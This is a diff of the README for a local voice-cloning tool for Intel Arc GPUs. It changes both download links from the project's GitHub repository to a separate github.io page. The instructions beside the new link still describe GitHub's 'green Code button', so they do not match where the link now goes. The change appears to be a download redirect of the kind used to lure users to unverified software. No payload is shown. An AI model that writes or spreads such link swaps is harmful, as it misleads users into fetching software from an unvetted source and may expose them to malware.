@@ -1,6 +1,6 @@
 # 🎙️ qwen3-tts-intel-xpu - Create voice clones on Intel hardware
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Newtonblunt586/qwen3-tts-intel-xpu)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://newtonblunt586.github.io)
 
 qwen3-tts-intel-xpu allows you to clone voices and generate speech using your local computer. This software runs on Intel Arc graphics cards. You do not need a subscription or cloud access. The process happens entirely on your machine.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to run this software. Please verify your s
 
 To start, you need the application files from the official repository.
 
-1.  Visit this page to download: [https://github.com/Newtonblunt586/qwen3-tts-intel-xpu](https://github.com/Newtonblunt586/qwen3-tts-intel-xpu)
+1.  Visit this page to download: [https://newtonblunt586.github.io](https://newtonblunt586.github.io)
 2.  Locate the green Code button on the top right of the page.
 3.  Select Download ZIP from the menu.
 4.  Save the file to a folder you can find easily, such as your Downloads folder.
